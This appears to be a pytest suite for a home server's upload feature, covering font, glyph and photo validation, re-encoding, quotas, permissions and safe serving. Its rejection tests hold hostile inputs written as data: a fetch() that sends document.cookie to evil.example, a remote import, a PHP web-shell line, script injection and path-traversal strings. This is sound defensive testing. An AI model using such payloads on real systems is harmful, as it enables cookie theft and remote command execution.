"""Your files on Mantel Server (user_files.py): Owner/Admin uploads of fonts, glyphs and photos, checked by
their bytes, normalised, size-capped, stored outside the web root and served at the URLs HK already uses;
CSRF; the one-time import. Every font, glyph and photo here is GENERATED at run time -- nothing of Apple's,
and nothing in git (tests/test_user_files_guard.py)."""
import asyncio
import io
import json
import os
import struct
import sys
import threading
import time
from pathlib import Path

import pytest
from aiohttp import FormData
from aiohttp.test_utils import TestClient, TestServer
from argon2 import PasswordHasher
from PIL import Image

from conftest import Mantel
from mantel_server import user_files as uf
from mantel_server.__main__ import main as cli_main


# -- generated stand-ins ----------------------------------------------------------------------------
def dummy_sfnt(tag=b"\x00\x01\x00\x00", payload=b"dummy table data") -> bytes:
    """A tiny but structurally valid sfnt: header, one table record, the table."""
    body = struct.pack(">4sHHHH", tag, 1, 16, 0, 0)
    record = struct.pack(">4sIII", b"dumy", 0, 12 + 16, len(payload))
    return body + record + payload


def dummy_woff2(extra=64) -> bytes:
    total = 48 + extra
    head = struct.pack(">4sIIHH", b"wOF2", 0x00010000, total, 1, 0) + b"\x00" * (48 - 16)
    return head + b"\x01" * extra


GLYPHS = {"icons": {"light-on": "M 1 1 L 5 5 Z", "door-closed-lock": "M 0 0 H 10 V 10 Z"},
          "twotone": {"fan": {"path": "M 1 2 L 3 4", "secondaryPath": "M 5 6 L 7 8 Z"}},
          "weather": {"sun.max": ["0.0 0.0 120 120", [["y", "M 1 1 L 2 2 Z"], ["w", "M 3 3 L 4 4 Z"]]]}}


def official_js(g=GLYPHS, comment="// built by someone's build_glyphs.py\n") -> bytes:
    """The shape tools/sf_symbols/build_glyphs.py writes (also what render_glyphs writes)."""
    return (comment.encode() + uf.render_glyphs(g).split(b"\n", 2)[2]) if comment else uf.render_glyphs(g)


def picture(fmt="JPEG", size=(80, 60), mode="RGB", color=(200, 30, 30), exif=False, **kw) -> bytes:
    img = Image.new(mode, size, color)
    buf = io.BytesIO()
    if exif:
        ex = Image.Exif()
        ex[0x0112] = 6                                                   # rotate 90
        ex[0x010F] = "ACME camera"
        ex[0x8825] = {1: "N", 2: (41.0, 52.0, 0.0), 3: "W", 4: (87.0, 38.0, 0.0)}     # GPS
        kw["exif"] = ex
    img.save(buf, fmt, **kw)
    return buf.getvalue()


# -- the app -----------------------------------------------------------------------------------------
@pytest.fixture
async def mantel(tmp_path, monkeypatch):
    from mantel_server.config import Config
    from mantel_server.ha_client import HaClient
    from mantel_server.readproxy import ReadProxy
    from mantel_server.server import build_app
    from mantel_server.store import Store

    async def forbidden(*args, **kwargs):
        pytest.fail("user-files tests attempted upstream access")

    monkeypatch.setattr(HaClient, "run", forbidden)
    monkeypatch.setattr(HaClient, "_send", forbidden)
    monkeypatch.setattr(ReadProxy, "request", forbidden)
    dev = tmp_path / "dev_files"
    cfg = Config(data_dir=tmp_path / "data", secrets_dir=tmp_path / "secrets", port=0, hk_files=dev)
    store = Store(cfg.data_dir / "mantel.db")
    now = [1_000_000.0]
    app = build_app(cfg, "unused-fictional-token", store=store, connect_ha=False, clock=lambda: now[0])
    app["accounts"].hasher = PasswordHasher(time_cost=1, memory_cost=8, parallelism=1)
    uf.register(app, app["hub"])
    async with TestClient(TestServer(app)) as client:
        origin = str(client.make_url("")).rstrip("/")
        client.session.headers["Origin"] = origin
        m = Mantel(app, client, store, now, origin)
        await m.user("avery", "owner")
        await m.user("alex", "admin")
        await m.user("jordan", "adult")
        await m.user("cody", "child")
        yield m
    store.db.close()


async def upload(m, kind, data, filename="f.bin", *, name=None, csrf=True, path=None):
    fd = FormData()
    if name is not None:
        fd.add_field("name", name)
    fd.add_field("file", data, filename=filename, content_type="application/octet-stream")
    return await m.client.post(path or f"/api/user-files/{kind}", data=fd, headers=m.headers(csrf))


def root(m) -> Path:
    return m.app["cfg"].data_dir / "user-files"


# -- fonts -------------------------------------------------------------------------------------------
async def test_an_owner_uploads_a_font_and_it_is_served_at_the_url_hk_uses(mantel):
    m = mantel
    await m.sign_in("avery")
    data = dummy_woff2()
    r = await upload(m, "font", data, "SF-Pro.woff2")
    assert r.status == 201, await r.text()
    body = await r.json()
    assert body["url"] == "/hk/fonts/SF-Pro.woff2" and body["type"] == "font/woff2" and body["size"] == len(data)
    stored = root(m) / "hk/fonts/SF-Pro.woff2"
    assert stored.read_bytes() == data and (stored.stat().st_mode & 0o777) == 0o600
    assert (root(m).stat().st_mode & 0o777) == 0o700 and ((root(m) / "hk").stat().st_mode & 0o777) == 0o700
    r = await m.client.get("/hk/fonts/SF-Pro.woff2")
    assert r.status == 200 and await r.read() == data
    assert r.headers["Content-Type"] == "font/woff2"
    assert r.headers["Cache-Control"] == "no-cache" and r.headers["X-Content-Type-Options"] == "nosniff"
    r = await m.client.head("/hk/fonts/SF-Pro.woff2")
    assert r.status == 200 and r.headers["Content-Type"] == "font/woff2"
    # the bundled stylesheet at the neighbouring URL is still HK's own
    r = await m.client.get("/hk/fonts/sf-pro.css")
    assert r.status == 200 and "SF Pro" in await r.text()
    r = await m.client.get("/api/user-files")
    listing = await r.json()
    assert [f["name"] for f in listing["fonts"]] == ["SF-Pro.woff2"] and listing["status"] == {"font": True, "glyphs": False}


async def test_ttf_and_otf_and_the_extension_must_agree_with_the_bytes(mantel):
    m = mantel
    await m.sign_in("alex")                                              # an Admin may upload too
    for filename, data, ctype in (("SF-Pro.ttf", dummy_sfnt(), "font/ttf"),
                                  ("Brand.otf", dummy_sfnt(b"OTTO"), "font/otf")):
        r = await upload(m, "font", data, filename)
        assert r.status == 201, await r.text()
        r = await m.client.get("/hk/fonts/" + filename)
        assert r.headers["Content-Type"] == ctype
    r = await upload(m, "font", dummy_sfnt(), "SF-Pro.woff2")           # ttf bytes, woff2 name
    assert r.status == 415 and (await r.json())["error"] == "font_type_mismatch"
    for junk in (b"<html><script>alert(1)</script></html>", b"wOF2" + b"\x00" * 40, os.urandom(300), b"",
                 dummy_sfnt()[:20]):
        r = await upload(m, "font", junk or b"x", "Evil.woff2")
        assert r.status in (400, 415), (junk[:20], r.status)
    assert sorted(p.name for p in (root(m) / "hk/fonts").iterdir()) == ["Brand.otf", "SF-Pro.ttf"]


@pytest.mark.parametrize("given,stored", [("../../etc/SF-Pro.ttf", "SF-Pro.ttf"), ("C:\\Fonts\\SF Pro.ttf", "SF-Pro.ttf"),
                                         ("My Font (1).TTF", "My-Font-1.ttf"), (".hidden.ttf", "hidden.ttf"),
                                         ("Ｓｆ-Ｐｒｏ.ttf", "Sf-Pro.ttf"), ("a/b/c.ttf", "c.ttf"), ("SF-Pro.ttf\x00.exe", "SF-Pro.ttf.exe")])
def test_normalize_name_units(given, stored):
    exts = {".ttf", ".exe"} if stored.endswith(".exe") else {".ttf"}
    if stored.endswith(".exe"):
        with pytest.raises(uf.FileError):
            uf.normalize_name(given, exts={".ttf"})
        return
    assert uf.normalize_name(given, exts=exts) == stored


@pytest.mark.parametrize("given,stored", [("My Font (1).TTF", "My-Font-1.ttf"), (".hidden.ttf", "hidden.ttf"),
                                         ("Ｓｆ-Ｐｒｏ.ttf", "Sf-Pro.ttf"), ("SF-Pro.ttf", "SF-Pro.ttf"),
                                         ("../x/SF-Pro.ttf", "SF-Pro.ttf")])
async def test_file_names_are_normalised(mantel, given, stored):
    m = mantel
    await m.sign_in("avery")
    r = await upload(m, "font", dummy_sfnt(), given)
    assert r.status == 201, await r.text()
    assert (await r.json())["name"] == stored
    assert (root(m) / "hk/fonts" / stored).is_file()
    assert [p for p in root(m).rglob("*") if p.is_file() and p.name != stored] == []
    # the name field of the form wins over the browser's file name
    r = await upload(m, "font", dummy_sfnt(), "ignored.ttf", name="SF-Pro.ttf")
    assert (await r.json())["name"] == "SF-Pro.ttf"


async def test_unusable_names_are_refused(mantel):
    m = mantel
    await m.sign_in("avery")
    for bad in ("...", "////", "-.ttf", "noextension", "font.exe", "font.js"):
        r = await upload(m, "font", dummy_sfnt(), bad)
        assert r.status == 400 and (await r.json())["error"] == "bad_name", bad


# -- glyphs ------------------------------------------------------------------------------------------
async def test_glyphs_are_parsed_as_data_and_rewritten_by_us(mantel):
    m = mantel
    await m.sign_in("avery")
    src = official_js(comment="// built by tools/sf_symbols/build_glyphs.py <script>alert('x')</script>\n")
    r = await upload(m, "glyphs", src, "whatever.js")
    assert r.status == 201, await r.text()
    body = await r.json()
    assert body["url"] == "/hk/iconset/hk-glyphs.js" and (body["icons"], body["twotone"], body["weather"]) == (2, 1, 1)
    r = await m.client.get("/hk/iconset/hk-glyphs.js")
    text = await r.text()
    assert r.status == 200 and r.headers["Content-Type"].startswith("text/javascript")
    assert r.headers["Cache-Control"] == "no-cache" and r.headers["X-Content-Type-Options"] == "nosniff"
    assert "<script>" not in text and "alert" not in text            # the uploaded bytes are not what is served
    assert text.count("hkGlyphs") == 1 and text.rstrip().endswith("};")
    assert uf.check_glyphs(text.encode()) == GLYPHS                  # and it round-trips through our own checker
    # JSON is accepted too, and replaces the file
    r = await upload(m, "glyphs", json.dumps({"icons": {"a-b": "M 0 0 L 1 1"}}).encode(), "g.json")
    assert r.status == 201 and (await r.json())["icons"] == 1
    assert (await (await m.client.get("/api/user-files")).json())["status"]["glyphs"] is True


@pytest.mark.parametrize("payload", [
    b'window.hkGlyphs = {icons: {"a": "M 0 0"}};\nfetch("https://evil.example/x?c="+document.cookie);',
    b'(typeof window !== "undefined" ? window : globalThis).hkGlyphs = {icons: {"a": "M 0 0"}, x: alert(1)};',
    b'window.hkGlyphs = {icons: {"a": "M 0 0"}};alert(1)',
    b'import("//evil.example/x.js")',
    b'window.hkGlyphs = (function(){ return {icons:{"a":"M 0 0"}} })();',
    b'window.hkGlyphs = {icons: {"a": "M 0 0 </script><script>alert(1)"}};',
    b'window.hkGlyphs = {icons: {"a": 5}};',
    b'window.hkGlyphs = {icons: {}};',
    b'window.hkGlyphs = {icons: {"a": "M 0 0"}, evil: {}};',
    b'window.hkGlyphs = {icons: {"a b": "M 0 0"}};',
    b'window.hkGlyphs = {icons: {"a": "M 0 0"}, twotone: {"b": {"path": "M 0 0"}}};',
    b'window.hkGlyphs = {icons: {"a": "M 0 0"}, weather: {"b": ["bad", []]}};',
    b'\xff\xfe not utf8', b'', b'{', b'[1,2]', b'`template`',
])
async def test_glyph_uploads_that_are_code_or_the_wrong_shape_are_refused(mantel, payload):
    m = mantel
    await m.sign_in("avery")
    r = await upload(m, "glyphs", payload or b" ", "hk-glyphs.js")
    assert r.status in (400, 415), await r.text()
    if r.status == 415:
        assert (await r.json())["error"] == "glyphs_invalid"
    assert not (root(m) / "hk/iconset/hk-glyphs.js").exists()


def test_glyph_checker_accepts_the_real_build_format_with_trailing_commas():
    text = '''// hk-glyphs.js -- anything in comments
(typeof window !== "undefined" ? window : globalThis).hkGlyphs = {
icons: {
  "light-on": "M 1.5 2.5 C 3 4, 5 6, 7 8 Z",
},
twotone: {
  "fan": {
    path: "M 1 2",
    secondaryPath: "M 3 4"
  },
},
weather: {
  "sun.max": ["0.0 0.0 120 120",[["y","M 1 1"]]],
},
};
'''
    g = uf.check_glyphs(text.encode())
    assert g["icons"] == {"light-on": "M 1.5 2.5 C 3 4, 5 6, 7 8 Z"} and g["twotone"]["fan"]["secondaryPath"] == "M 3 4"
    assert g["weather"]["sun.max"][1] == [["y", "M 1 1"]]


# -- photos ------------------------------------------------------------------------------------------
async def test_photos_are_reencoded_stripped_and_served_by_the_ha_style_address(mantel):
    m = mantel
    await m.sign_in("avery")
    original = picture("JPEG", (80, 60), exif=True)
    assert b"ACME camera" in original and b"Exif" in original
    r = await upload(m, "photo", original, "IMG_0001.JPG")
    assert r.status == 201, await r.text()
    body = await r.json()
    assert len(body["id"]) == 32 and body["url"] == f"/api/image/serve/{body['id']}/original"
    stored = next((root(m) / "photos").iterdir())
    assert stored.name == body["id"] + ".jpg" and (stored.stat().st_mode & 0o777) == 0o600
    raw = stored.read_bytes()
    assert b"ACME camera" not in raw and b"GPS" not in raw and raw != original
    img = Image.open(io.BytesIO(raw))
    assert img.format == "JPEG" and img.size == (60, 80)                    # EXIF rotation applied, then dropped
    assert not dict(img.getexif()) and "exif" not in img.info
    r = await m.client.get(body["url"])
    assert r.status == 200 and r.headers["Content-Type"] == "image/jpeg" and r.headers["Cache-Control"] == "no-cache"
    assert await r.read() == raw
    assert (await m.client.get(f"/api/image/serve/{body['id']}/256x256")).status == 200     # any HA size name
    assert (await m.client.get("/api/image/serve/" + "0" * 32 + "/original")).status == 404
    assert (await m.client.get("/api/image/serve/not-an-id/original")).status == 404


async def test_ha_upload_contract_returns_the_id_hk_stores(mantel):
    m = mantel
    await m.sign_in("alex")
    fd = FormData()
    fd.add_field("file", picture("JPEG"), filename="hk-background.jpg", content_type="image/jpeg")
    r = await m.client.post("/api/image/upload", data=fd, headers=m.headers())
    assert r.status == 200
    j = await r.json()
    assert len(j["id"]) == 32 and j["content_type"] == "image/jpeg" and j["filesize"] > 0
    assert (await m.client.get(f"/api/image/serve/{j['id']}/original")).status == 200
    r = await m.client.delete(f"/api/image/{j['id']}", headers=m.headers())
    assert r.status == 200 and (await m.client.get(f"/api/image/serve/{j['id']}/original")).status == 404
    r = await m.client.delete(f"/api/image/{j['id']}", headers=m.headers())
    assert r.status == 404


@pytest.mark.parametrize("data,ctype,ext", [
    (lambda: picture("PNG", mode="RGBA", color=(1, 2, 3, 128)), "image/png", ".png"),
    (lambda: picture("WEBP", quality=70), "image/webp", ".webp"),
    (lambda: picture("JPEG", (6000, 3000)), "image/jpeg", ".jpg"),
])
async def test_other_formats_keep_their_kind_and_big_pictures_shrink(mantel, data, ctype, ext):
    m = mantel
    await m.sign_in("avery")
    r = await upload(m, "photo", data(), "p.bin")
    assert r.status == 201, await r.text()
    body = await r.json()
    assert body["type"] == ctype
    served = await (await m.client.get(body["url"])).read()
    img = Image.open(io.BytesIO(served))
    assert max(img.size) <= uf.PHOTO_EDGE
    if ext == ".png":
        assert img.mode == "RGBA"                                           # transparency survives
    if ext == ".jpg":
        assert img.size == (3840, 1920)


async def test_heic_becomes_jpeg(mantel):
    pillow_heif = pytest.importorskip("pillow_heif")
    pillow_heif.register_heif_opener()
    m = mantel
    await m.sign_in("avery")
    r = await upload(m, "photo", picture("HEIF", (64, 48)), "IMG.HEIC")
    assert r.status == 201, await r.text()
    body = await r.json()
    assert body["type"] == "image/jpeg"
    assert Image.open(io.BytesIO(await (await m.client.get(body["url"])).read())).format == "JPEG"


async def test_heic_without_the_decoder_is_a_clear_refusal(mantel, monkeypatch, image_threads):
    pillow_heif = pytest.importorskip("pillow_heif")
    pillow_heif.register_heif_opener()
    heic = picture("HEIF", (64, 48))
    monkeypatch.setitem(sys.modules, "pillow_heif", None)                   # import pillow_heif -> ImportError
    m = mantel
    await m.sign_in("avery")
    r = await upload(m, "photo", heic, "IMG.HEIC")
    assert r.status == 415 and (await r.json())["error"] == "heic_unsupported"


@pytest.mark.parametrize("data", [b"GIF89a" + b"\x00" * 50, b"<svg xmlns='http://www.w3.org/2000/svg'><script>1</script></svg>",
                                  b"\xff\xd8\xff" + os.urandom(200), b"%PDF-1.4 fake", b"\x89PNG\r\n\x1a\n" + b"junk",
                                  b"RIFF\x00\x00\x00\x00WEBPjunk", b"MZ" + os.urandom(100),
                                  dummy_woff2(), b"<?php system($_GET['c']); ?>"],
                         # (fixed ids: some are random bytes, and pytest-xdist's workers must collect the same names)
                         ids=["gif", "svg-script", "jpeg-head-random", "pdf", "png-head-junk", "webp-head-junk", "exe-random",
                              "woff2", "php"])
async def test_things_that_are_not_pictures_are_refused(mantel, data):
    m = mantel
    await m.sign_in("avery")
    r = await upload(m, "photo", data, "photo.jpg")                          # a lying name changes nothing
    assert r.status == 415 and (await r.json())["error"] == "photo_invalid"
    assert not (root(m) / "photos").exists() or not list((root(m) / "photos").iterdir())


async def test_a_picture_with_too_many_pixels_is_refused(mantel):
    m = mantel
    await m.sign_in("avery")
    huge = picture("PNG", (9000, 9000), mode="1", color=1)                  # 81 MP, tiny on the wire
    assert len(huge) < uf.PHOTO_MAX
    r = await upload(m, "photo", huge, "huge.png")
    assert r.status == 413 and (await r.json())["error"] == "photo_too_large"


# -- limits ------------------------------------------------------------------------------------------
async def test_size_caps_apply_while_streaming_and_by_content_length(mantel, monkeypatch):
    m = mantel
    await m.sign_in("avery")
    monkeypatch.setattr(uf, "FONT_MAX", 2000)
    ok = dummy_sfnt(payload=b"x" * 900)
    assert (await upload(m, "font", ok, "a.ttf")).status == 201
    big = dummy_sfnt(payload=b"x" * 3000)
    r = await upload(m, "font", big, "b.ttf")
    assert r.status == 413 and (await r.json())["error"] == "too_large"
    assert not (root(m) / "hk/fonts/b.ttf").exists()
    monkeypatch.setattr(uf, "FONT_MAX", 100)                                 # a declared length that is already too much
    r = await upload(m, "font", b"y" * (2 << 20), "c.ttf")
    assert r.status == 413
    monkeypatch.setattr(uf, "GLYPHS_MAX", 50)
    assert (await upload(m, "glyphs", official_js(), "g.js")).status == 413
    monkeypatch.setattr(uf, "PHOTO_MAX", 500)
    assert (await upload(m, "photo", os.urandom(800), "p.jpg")).status == 413


async def test_the_folder_has_a_quota(mantel, monkeypatch):
    m = mantel
    await m.sign_in("avery")
    monkeypatch.setattr(uf, "QUOTA", 400)
    assert (await upload(m, "font", dummy_sfnt(payload=b"x" * 100), "a.ttf")).status == 201
    r = await upload(m, "font", dummy_sfnt(payload=b"x" * 500), "b.ttf")
    assert r.status == 413 and (await r.json())["error"] == "quota_exceeded"
    assert (await upload(m, "font", dummy_sfnt(payload=b"x" * 150), "a.ttf")).status == 201      # replacing is net smaller


async def test_a_wrong_kind_and_a_non_multipart_body(mantel):
    m = mantel
    await m.sign_in("avery")
    assert (await upload(m, "script", b"x", "x.js")).status == 404
    r = await m.client.post("/api/user-files/font", data=dummy_sfnt(), headers=m.headers())
    assert r.status == 415 and (await r.json())["error"] == "multipart_required"
    fd = FormData()
    fd.add_field("other", b"no file here", filename="o.bin")
    r = await m.client.post("/api/user-files/font", data=fd, headers=m.headers())
    assert r.status == 400 and (await r.json())["error"] == "file_required"


# -- who may -----------------------------------------------------------------------------------------
async def test_only_owner_and_admin_may_upload_list_or_delete_and_csrf_is_required(mantel):
    m = mantel
    r = await upload(m, "font", dummy_sfnt(), "SF-Pro.ttf")
    assert r.status in (401, 403)                                            # nobody signed in
    await m.sign_in("avery")
    assert (await upload(m, "font", dummy_sfnt(), "SF-Pro.ttf")).status == 201
    for who in ("jordan", "cody"):
        await m.sign_in(who)
        assert (await upload(m, "font", dummy_sfnt(), "x.ttf")).status == 403
        assert (await upload(m, "photo", picture(), "x.jpg")).status == 403
        assert (await upload(m, "photo", picture(), "x.jpg", path="/api/image/upload")).status == 403
        assert (await m.client.get("/api/user-files")).status == 403
        assert (await m.client.delete("/api/user-files/font/SF-Pro.ttf", headers=m.headers())).status == 403
        # but a signed-in person can fetch what is served (the fonts and glyphs every screen needs)
        assert (await m.client.get("/hk/fonts/SF-Pro.ttf")).status == 200
    await m.sign_in("alex")
    assert (await upload(m, "font", dummy_sfnt(), "x.ttf", csrf=False)).status == 403       # no CSRF header
    assert not (root(m) / "hk/fonts/x.ttf").exists()
    r = await m.client.delete("/api/user-files/font/SF-Pro.ttf")
    assert r.status == 403 and (root(m) / "hk/fonts/SF-Pro.ttf").exists()
    r = await m.client.delete("/api/user-files/font/SF-Pro.ttf", headers=m.headers())
    assert r.status == 200 and not (root(m) / "hk/fonts/SF-Pro.ttf").exists()
    assert (await m.client.delete("/api/user-files/font/SF-Pro.ttf", headers=m.headers())).status == 404
    # anonymous requests do not get the files either (same sign-in as the rest of Mantel)
    m.forget_cookies()
    assert (await m.client.get("/hk/fonts/SF-Pro.ttf")).status == 401


async def test_uploads_are_audited(mantel):
    m = mantel
    await m.sign_in("avery")
    await upload(m, "font", dummy_sfnt(), "SF-Pro.ttf")
    await upload(m, "photo", picture(), "p.jpg")
    await m.client.delete("/api/user-files/font/SF-Pro.ttf", headers=m.headers())
    rows = m.app["store"].db.execute("SELECT action, role, target FROM action_audit WHERE action LIKE 'user_files.%' "
                                     "ORDER BY id").fetchall()
    assert [r["action"] for r in rows] == ["user_files.upload.font", "user_files.upload.photo", "user_files.delete.font"]
    assert all(r["role"] == "owner" for r in rows)


# -- serving rules -----------------------------------------------------------------------------------
async def test_uploaded_files_win_over_the_dev_folder_and_the_bundle_and_deleting_falls_back(mantel):
    m = mantel
    dev = m.app["cfg"].hk_files
    (dev / "fonts").mkdir(parents=True)
    (dev / "fonts" / "SF-Pro.ttf").write_bytes(b"from the dev folder")
    await m.sign_in("avery")
    assert await (await m.client.get("/hk/fonts/SF-Pro.ttf")).read() == b"from the dev folder"     # hk_files still works
    await upload(m, "font", dummy_sfnt(), "SF-Pro.ttf")
    assert await (await m.client.get("/hk/fonts/SF-Pro.ttf")).read() == dummy_sfnt()
    await m.client.delete("/api/user-files/font/SF-Pro.ttf", headers=m.headers())
    assert await (await m.client.get("/hk/fonts/SF-Pro.ttf")).read() == b"from the dev folder"
    # an absent file is 404 as before
    assert (await m.client.get("/hk/fonts/Nothing.ttf")).status == 404


async def test_serving_is_not_a_way_out_of_the_folder(mantel, tmp_path):
    m = mantel
    await m.sign_in("avery")
    await upload(m, "font", dummy_sfnt(), "SF-Pro.ttf")
    secret = tmp_path / "outside.ttf"
    secret.write_bytes(b"outside the folder")
    fonts = root(m) / "hk/fonts"
    (fonts / "link.ttf").symlink_to(secret)
    (fonts / "notes.txt").write_text("not a served type")
    (fonts / ".hidden.ttf").write_bytes(b"hidden")
    (root(m) / "hk" / "mantel.db").write_bytes(b"not for the web")
    for url in ("/hk/fonts/link.ttf", "/hk/fonts/notes.txt", "/hk/fonts/.hidden.ttf", "/hk/mantel.db",
                "/hk/fonts/..%2F..%2F..%2Fmantel.db", "/hk/fonts/%2e%2e/%2e%2e/outside.ttf", "/hk/../user-files/hk/mantel.db",
                "/hk/fonts/", "/hk/fonts"):
        r = await m.client.get(url)
        body = await r.read()
        assert r.status in (404, 400, 403) and b"outside the folder" not in body and b"not for the web" not in body, url
    assert not (root(m) / "photos").exists()                                  # nothing under photos for /hk/photos
    assert (await m.client.get("/hk/photos/x.jpg")).status == 404
    # POST/PUT to the served paths are not a way to write
    r = await m.client.put("/hk/fonts/SF-Pro.ttf", data=b"x", headers=m.headers())
    assert r.status in (404, 405)
    assert (fonts / "SF-Pro.ttf").read_bytes() == dummy_sfnt()


# -- the one-time import -----------------------------------------------------------------------------
def make_folder(tmp_path):
    src = tmp_path / "hk_local"
    (src / "fonts").mkdir(parents=True)
    (src / "fonts" / "SF-Pro.woff2").write_bytes(dummy_woff2())
    (src / "fonts" / "readme.txt").write_text("notes")
    (src / "fonts" / "Broken.ttf").write_bytes(b"not a font")
    (src / "iconset").mkdir()
    (src / "iconset" / "hk-glyphs.js").write_bytes(official_js())
    (src / "sky").mkdir()
    (src / "sky" / "clouds-a.webp").write_bytes(picture("WEBP", (40, 30)))
    (src / "sky" / "fake.png").write_bytes(b"garbage")
    (src / "sky" / "wrongkind.png").write_bytes(picture("JPEG"))              # jpeg bytes under a png name
    (src / "probe.html").write_text("<script>alert(1)</script>")
    (src / "extra.js").write_text("alert(2)")
    (src / "film.mp4").write_bytes(b"\x00\x00\x00\x18ftypmp42")
    (src / ".secret").write_text("x")
    images = tmp_path / "image"
    for pid in ("a" * 32, "b" * 32):
        (images / pid).mkdir(parents=True)
        (images / pid / "original").write_bytes(picture("JPEG", (50, 40), exif=True))
        (images / pid / "256x256").write_bytes(b"ignored variant")
    (images / "notanid").mkdir()
    (images / "notanid" / "original").write_bytes(picture("JPEG"))
    www = tmp_path / "www"
    (www / "photos").mkdir(parents=True)
    (www / "photos" / "porch.jpg").write_bytes(picture("JPEG", (30, 30)))
    (www / "secrets.txt").write_text("hunter2")
    (www / "app.js").write_text("x")
    return src, images, www


def test_import_cli_copies_checks_and_skips(tmp_path, capsys):
    src, images, www = make_folder(tmp_path)
    data = tmp_path / "data"
    args = ["import-files", str(src), "--images", str(images), "--www", str(www), "--data-dir", str(data)]
    assert cli_main([*args, "--dry-run"]) == 0
    assert "would import" in capsys.readouterr().out and not (data / "user-files").exists()
    assert cli_main(args) == 0
    out = capsys.readouterr().out
    base = data / "user-files"
    assert (base / "hk/fonts/SF-Pro.woff2").read_bytes() == dummy_woff2()
    assert uf.check_glyphs((base / "hk/iconset/hk-glyphs.js").read_bytes()) == GLYPHS
    assert Image.open(base / "hk/sky/clouds-a.webp").format == "WEBP"
    for pid in ("a" * 32, "b" * 32):
        assert Image.open(base / "photos" / f"{pid}.jpg").size == (40, 50)    # re-encoded: rotated, EXIF gone
    assert Image.open(base / "local/photos/porch.jpg").format == "JPEG"
    written = sorted(str(p.relative_to(base)) for p in base.rglob("*") if p.is_file())
    assert written == ["hk/fonts/SF-Pro.woff2", "hk/iconset/hk-glyphs.js", "hk/sky/clouds-a.webp",
                       f"local/photos/porch.jpg", f"photos/{'a' * 32}.jpg", f"photos/{'b' * 32}.jpg"]
    for skipped in ("fonts/readme.txt", "fonts/Broken.ttf", "sky/fake.png", "sky/wrongkind.png", "probe.html", "extra.js",
                    "film.mp4", ".secret"):
        assert f"skipped      {skipped}" in out, skipped
    assert "no scripts, styles, pages or video" in out
    assert "hunter2" not in "".join(p.read_text(errors="ignore") for p in base.rglob("*") if p.is_file() and p.suffix == ".txt")
    assert cli_main(args) == 0                                                # running it twice changes nothing
    assert sorted(str(p.relative_to(base)) for p in base.rglob("*") if p.is_file()) == written


def test_import_cli_needs_real_folders(tmp_path, capsys):
    assert cli_main(["import-files", str(tmp_path / "nope"), "--data-dir", str(tmp_path / "d")]) == 2
    assert "is not a folder" in capsys.readouterr().err


async def test_imported_files_are_served_at_the_same_urls_the_old_setup_used(mantel, tmp_path, capsys):
    m = mantel
    src, images, www = make_folder(tmp_path)
    assert cli_main(["import-files", str(src), "--images", str(images), "--www", str(www),
                     "--data-dir", str(m.app["cfg"].data_dir)]) == 0
    await m.sign_in("jordan")                                               # any signed-in person
    for url, ctype in (("/hk/fonts/SF-Pro.woff2", "font/woff2"), ("/hk/iconset/hk-glyphs.js", "text/javascript"),
                       ("/hk/sky/clouds-a.webp", "image/webp"), (f"/api/image/serve/{'a' * 32}/original", "image/jpeg"),
                       ("/local/photos/porch.jpg", "image/jpeg")):
        r = await m.client.get(url)
        assert r.status == 200 and r.headers["Content-Type"].startswith(ctype), url
        assert r.headers["Cache-Control"] == "no-cache"
    assert (await m.client.get("/local/secrets.txt")).status == 404
    assert (await m.client.get("/hk/probe.html")).status in (404,)


# -- the licensed assets: import-assets, serving, ETag ----------------------------------------------------
def ha_like_folder(tmp_path, layout):
    """A stand-in for a copy of HA's www/hk (or the integration's frontend folder), with decoys beside the files."""
    base = tmp_path / "copy"
    root = base / layout if layout else base
    (root / "fonts").mkdir(parents=True)
    (root / "iconset").mkdir()
    (root / "fonts" / "SF-Pro.woff2").write_bytes(dummy_woff2())
    (root / "fonts" / "SF-Pro.ttf").write_bytes(dummy_sfnt())
    (root / "iconset" / "hk-glyphs.js").write_bytes(official_js())
    (root / "iconset" / "hk-icons.js").write_text("alert(1)")                     # HK's own, never taken
    (root / "extra.js").write_text("alert(2)")
    (root / "sky").mkdir()
    (root / "sky" / "clouds.webp").write_bytes(picture("WEBP", (20, 20)))         # an image: not an asset
    return base


@pytest.mark.parametrize("layout", ["", "hk", "www/hk", "frontend", "custom_components/hk_frontend/frontend"])
def test_import_assets_picks_only_the_three_known_files_from_any_ha_layout(tmp_path, capsys, layout):
    src = ha_like_folder(tmp_path, layout)
    data = tmp_path / "data"
    assert cli_main(["files", "import-assets", str(src), "--data-dir", str(data), "--dry-run"]) == 0
    assert "would import" in capsys.readouterr().out and not (data / "user-files").exists()
    assert cli_main(["files", "import-assets", str(src), "--data-dir", str(data)]) == 0
    out = capsys.readouterr().out
    base = data / "user-files"
    written = sorted(str(p.relative_to(base)) for p in base.rglob("*") if p.is_file())
    assert written == ["hk/fonts/SF-Pro.ttf", "hk/fonts/SF-Pro.woff2", "hk/iconset/hk-glyphs.js"]
    assert (base / "hk/fonts/SF-Pro.woff2").read_bytes() == dummy_woff2()
    assert uf.check_glyphs((base / "hk/iconset/hk-glyphs.js").read_bytes()) == GLYPHS
    assert "3 imported, 0 skipped" in out
    assert cli_main(["files", "import-assets", str(src), "--data-dir", str(data)]) == 0       # idempotent
    assert sorted(str(p.relative_to(base)) for p in base.rglob("*") if p.is_file()) == written


def test_import_assets_flat_folder_and_reports_what_is_missing(tmp_path, capsys):
    flat = tmp_path / "flat"
    flat.mkdir()
    (flat / "SF-Pro.woff2").write_bytes(dummy_woff2())
    data = tmp_path / "data"
    assert cli_main(["files", "import-assets", str(flat), "--data-dir", str(data)]) == 0
    out = capsys.readouterr().out
    assert "imported     fonts/SF-Pro.woff2" in out and "skipped      iconset/hk-glyphs.js  (not found" in out
    empty = tmp_path / "empty"
    empty.mkdir()
    assert cli_main(["files", "import-assets", str(empty), "--data-dir", str(data)]) == 1     # nothing found
    capsys.readouterr()
    assert cli_main(["files", "import-assets", str(tmp_path / "nope"), "--data-dir", str(data)]) == 2
    assert "is not a folder" in capsys.readouterr().err


def test_import_assets_validates_type_and_size_and_ignores_symlinks(tmp_path, capsys, monkeypatch):
    src = tmp_path / "src"
    (src / "fonts").mkdir(parents=True)
    (src / "iconset").mkdir()
    (src / "fonts" / "SF-Pro.woff2").write_bytes(b"not a font at all, just text")             # bad bytes
    (src / "fonts" / "SF-Pro.ttf").write_bytes(dummy_woff2())                                  # woff2 bytes under .ttf
    (src / "iconset" / "hk-glyphs.js").write_text("window.hkGlyphs = {icons: fetch('/x')};")   # code, not data
    data = tmp_path / "data"
    assert cli_main(["files", "import-assets", str(src), "--data-dir", str(data)]) == 1
